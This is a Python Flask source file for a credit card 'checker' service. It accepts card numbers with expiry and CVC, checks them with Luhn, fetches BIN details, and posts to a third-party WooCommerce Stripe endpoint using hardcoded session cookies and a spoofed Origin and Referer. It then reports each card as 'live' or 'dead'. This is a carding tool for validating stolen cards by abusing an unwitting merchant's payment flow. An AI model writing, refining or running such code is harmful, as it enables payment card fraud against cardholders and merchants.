from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
]

def luhn_checksum(card):
    digits = [int(d) for d in card if d.isdigit()]
    total = 0
    for i, d in enumerate(digits[::-1]):
        if i % 2 == 1:
            doubled = d * 2
            total += doubled if doubled < 10 else doubled - 9
        else:
            total += d
    return total % 10 == 0

def get_bin_info(bin6):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown"}

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def check_cc(path):
    params = {}
    query = request.query_string.decode()
    for p in query.split('&'):
        if '=' in p:
            k, v = p.split('=', 1)
            params[k] = v

    cc_str = params.get('cc', '')
    if '|' not in cc_str:
        return jsonify({"status": "error", "msg": "Use cc=number|mm|yy|cvc"}), 400

    cc, mm, yy, cvc = cc_str.split('|')[:4]
    site = params.get('site', 'e-led.lv')
    gateway = params.get('gateway', 'autostripe')

    # Luhn check
    if not luhn_checksum(cc):
        return jsonify({"status": "dead", "msg": "Luhn failed", "cc": cc}), 400

    bin_info = get_bin_info(cc[:6])

    # Fake PM_ID & Nonce (demo)
    pm_id = f"pm_1{random.randint(100000000,999999999)}kX{random.randint(100000,999999)}"
    nonce = "6a1ff713de"

    cookies = {
        "wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798": "usljfjae2q|1762849683|QMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo|c6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316",
        "__stripe_mid": "588bccab-9133-4397-b3e2-f2785fdd613ca53fc1",
        "__stripe_sid": "a5043f11-4679-4b52-962c-8747f54af89016e011"
    }

    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'https://{site}',
        'Referer': f'https://{site}/my-account/add-payment-method/',
    }

    payload = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    try:
        r = requests.post(f"https://{site}/wp-admin/admin-ajax.php", headers=headers, data=payload, cookies=cookies, timeout=12)
        result = r.json()

        if result.get('result') == 'success':
            return jsonify({
                "status": "live",
                "msg": "Card Live!",
                "cc": cc,
                "last4": cc[-4:],
                "bin_info": bin_info,
                "gateway": gateway,
                "site": site
            })
        else:
            msg = result.get('messages', 'Declined').replace('<div class="woocommerce-error">', '').replace('</div>', '').strip()
            return jsonify({
                "status": "dead",
                "msg": msg,
                "cc": cc,
                "bin_info": bin_info,
                "gateway": gateway,
                "site": site
            })
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

if __name__ == '__main__':
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
